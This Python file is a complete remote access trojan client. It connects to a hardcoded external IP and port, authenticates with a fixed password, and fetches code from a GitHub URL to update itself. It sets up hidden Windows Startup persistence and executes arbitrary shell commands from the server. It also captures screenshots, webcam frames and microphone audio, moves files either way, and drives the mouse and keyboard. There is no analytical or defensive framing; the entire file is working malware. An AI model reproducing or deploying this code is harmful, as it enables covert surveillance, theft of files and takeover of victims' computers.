import socket
import struct
import subprocess
import os
import time
import sys
from io import BytesIO
from PIL import ImageGrab
import pyautogui
import requests
import threading
import platform
import socket as s
import psutil
import sounddevice as sd
from scipy.io.wavfile import write
import numpy as np
import cv2
import shutil

SERVER_HOST = '176.106.246.150'
SERVER_PORT = 25565
PASSWORD = 'StrongPassword123'
UPDATE_URL = 'https://raw.githubusercontent.com/Dimonlomon/Private/refs/heads/main/client.py'
CHECK_INTERVAL = 300

def send_data(sock, data: bytes):
    sock.sendall(struct.pack('>I', len(data)))
    sock.sendall(data)

def recv_data(sock) -> bytes:
    raw_len = sock.recv(4)
    if not raw_len:
        return b''
    length = struct.unpack('>I', raw_len)[0]
    data = b''
    while len(data) < length:
        packet = sock.recv(length - len(data))
        if not packet:
            break
        data += packet
    return data

def auto_update():
    while True:
        try:
            r = requests.get(UPDATE_URL, timeout=10)
            if r.status_code == 200:
                remote_code = r.text
                local_path = os.path.realpath(__file__)
                with open(local_path, 'r', encoding='utf-8') as f:
                    local_code = f.read()
                if remote_code != local_code:
                    backup = local_path + '.bak'
                    os.replace(local_path, backup)
                    with open(local_path, 'w', encoding='utf-8') as f:
                        f.write(remote_code)
                    return
        except:
            pass
        time.sleep(CHECK_INTERVAL)

def setup_autostart():
    if os.name != 'nt':
        return

    appdata = os.environ.get('APPDATA')
    if not appdata:
        return

    startup_path = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    script_original = os.path.realpath(__file__)
    script_copy = os.path.join(startup_path, 'server_copy.py')
    bat_path = os.path.join(startup_path, 'client_start.bat')
    pythonw = sys.executable.replace('python.exe', 'pythonw.exe')

    try:
        # Копируем текущий скрипт
        if not os.path.exists(script_copy):
            shutil.copy2(script_original, script_copy)

        # Создаём BAT-файл для запуска копии
        if not os.path.exists(bat_path):
            with open(bat_path, 'w') as f:
                f.write(f'@echo off\n"{pythonw}" "{script_copy}"\n')
    except Exception as e:
        pass

def handle_connection(sock):
    try:
        send_data(sock, b'PASSWORD:')
        recv = recv_data(sock).decode()
        if recv != PASSWORD:
            send_data(sock, b'ACCESS DENIED')
            return
        send_data(sock, b'ACCESS GRANTED')

        while True:
            cmd = recv_data(sock).decode()
            if not cmd or cmd.lower() in ('exit', 'quit'):
                break
            parts = cmd.split()
            action = parts[0].lower()

            if action == 'ls':
                path = ' '.join(parts[1:]) or '.'
                try:
                    files = os.listdir(path)
                    send_data(sock, '\n'.join(files).encode())
                except Exception as e:
                    send_data(sock, f'ERROR: {e}'.encode())

            elif action == 'screenshot':
                img = ImageGrab.grab()
                buf = BytesIO()
                img.save(buf, format='PNG')
                send_data(sock, buf.getvalue())

            elif action == 'sysinfo':
                try:
                    info = f"OS: {platform.system()} {platform.release()}\n"
                    info += f"User: {os.getlogin()}\n"
                    info += f"Hostname: {s.gethostname()}\n"
                    info += f"IP: {s.gethostbyname(s.gethostname())}\n"
                    info += f"CPU: {platform.processor()}\n"
                    info += f"RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB"
                    send_data(sock, info.encode())
                except Exception as e:
                    send_data(sock, f'ERROR: {e}'.encode())

            elif action == 'download':
                filepath = ' '.join(parts[1:])
                try:
                    with open(filepath, 'rb') as f:
                        send_data(sock, f.read())
                except Exception as e:
                    send_data(sock, f'ERROR: {e}'.encode())

            elif action == 'upload':
                try:
                    filepath = parts[1]
                    data = recv_data(sock)
                    with open(filepath, 'wb') as f:
                        f.write(data)
                    send_data(sock, b'OK')
                except Exception as e:
                    send_data(sock, f'ERROR: {e}'.encode())

            elif action == 'webcam_snap':
                try:
                    cap = cv2.VideoCapture(0)
                    ret, frame = cap.read()
                    cap.release()
                    if ret:
                        _, buf = cv2.imencode('.png', frame)
                        send_data(sock, buf.tobytes())
                    else:
                        send_data(sock, b'ERROR: Failed to capture')
                except Exception as e:
                    send_data(sock, f'ERROR: {e}'.encode())

            elif action == 'record_audio':
                try:
                    duration = int(parts[1]) if len(parts) > 1 else 5
                    fs = 44100
                    recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
                    sd.wait()
                    temp = BytesIO()
                    write(temp, fs, recording)
                    temp.seek(0)
                    send_data(sock, temp.read())
                except Exception as e:
                    send_data(sock, f'ERROR: {e}'.encode())

            elif action == 'mouse_move':
                try:
                    x, y = map(int, parts[1:3])
                    pyautogui.moveTo(x, y)
                    send_data(sock, b'OK')
                except Exception as e:
                    send_data(sock, f'ERROR: {e}'.encode())

            elif action == 'mouse_click':
                try:
                    button = parts[1] if len(parts) > 1 else 'left'
                    clicks = int(parts[2]) if len(parts) > 2 else 1
                    pyautogui.click(button=button, clicks=clicks)
                    send_data(sock, b'OK')
                except Exception as e:
                    send_data(sock, f'ERROR: {e}'.encode())

            elif action == 'key_press':
                try:
                    pyautogui.press(parts[1])
                    send_data(sock, b'OK')
                except Exception as e:
                    send_data(sock, f'ERROR: {e}'.encode())

            elif action == 'key_write':
                try:
                    text = cmd[len('key_write'):].strip()
                    pyautogui.write(text)
                    send_data(sock, b'OK')
                except Exception as e:
                    send_data(sock, f'ERROR: {e}'.encode())

            else:
                try:
                    out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                except subprocess.CalledProcessError as e:
                    out = e.output
                send_data(sock, out)
    except Exception:
        pass
    finally:
        sock.close()

def connect_to_server():
    setup_autostart()
    threading.Thread(target=auto_update, daemon=True).start()
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((SERVER_HOST, SERVER_PORT))
                handle_connection(sock)
        except Exception:
            time.sleep(10)

if __name__ == '__main__':
    connect_to_server()
